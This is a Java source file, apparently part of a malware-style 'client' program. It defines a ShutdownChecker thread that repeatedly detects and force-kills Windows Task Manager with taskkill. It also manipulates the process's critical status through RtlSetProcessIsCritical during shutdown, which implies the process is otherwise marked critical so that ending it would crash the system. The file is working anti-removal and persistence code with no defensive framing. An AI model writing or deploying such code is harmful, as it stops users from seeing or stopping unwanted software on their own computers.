package client.utils.check;

import client.features.CmdExecutor;
import client.utils.dll.LoadNtdll;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ShutdownChecker extends Thread{
    @Override
    public void run() {
        new Thread(()->{
            while (true) {
                try {
                    Thread.sleep(100);
                    if(isProcessRunning("Taskmgr.exe")) {
                        CmdExecutor.executeCmd("taskkill /F /IM" + " Taskmgr.exe");
                    }

                    int b = User32.INSTANCE.GetSystemMetrics(WinUser.SM_SHUTTINGDOWN);
                    if(b == 1) {
                        LoadNtdll.instance.RtlSetProcessIsCritical(new WinDef.BOOL(false),null,new WinDef.BOOL(false));
                    }
                } catch (InterruptedException ignored) {
                }
            }
        }).start();

    }

    public static boolean isProcessRunning(String processName) {
        try {
            String line;
            ProcessBuilder processBuilder;
            if (System.getProperty("os.name").contains("Windows")) { // Windows系统
                processBuilder = new ProcessBuilder("tasklist");
            } else { // Linux或Mac系统
                processBuilder = new ProcessBuilder("ps", "-e");
            }
            Process process = processBuilder.start();
            BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));
            while ((line = input.readLine()) != null) {
                if (line.contains(processName)) {
                    return true;
                }
            }
            input.close();
            return false;
        } catch (IOException e) {
            return false;
        }
    }
}
